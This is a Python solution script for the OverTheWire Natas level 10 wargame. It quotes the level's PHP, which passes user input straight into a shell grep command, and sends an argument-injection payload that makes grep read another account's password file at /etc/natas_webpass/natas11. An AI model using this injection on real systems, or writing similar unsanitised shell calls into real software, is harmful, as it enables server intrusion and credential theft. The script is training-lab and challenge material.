'''
Same as before but more difficult because now they are filtering the input of the user.
Let's see what they are doing looking through the "index-source.html" file.
'''
import requests
import re

username = "natas10"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

'''
Exceptional Code:
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>

Now they are using the preg_match() and they are filtering out symbols that could use. So this is now out of our scope.
But now we can try to abuse the command "grep".
We know that it reads files and can use regular expressions so let's try to read the password from the server like before.
'''

# My new cmd (payload) abuse the grep command and says "read the natas11 file and print my anything that is a letter or a number".
cmd = "[A-Za-z0-9] /etc/natas_webpass/natas11"
response = session.post(url,auth=(username,password),data={"needle":cmd}) # POST request to the server with my new payload.
print(response.text)
print("="*50)

# Just Code Printing
code = re.findall(r"[A-Za-z0-9]{32}", response.text)[1]
print("The password for the next level is: " + code)
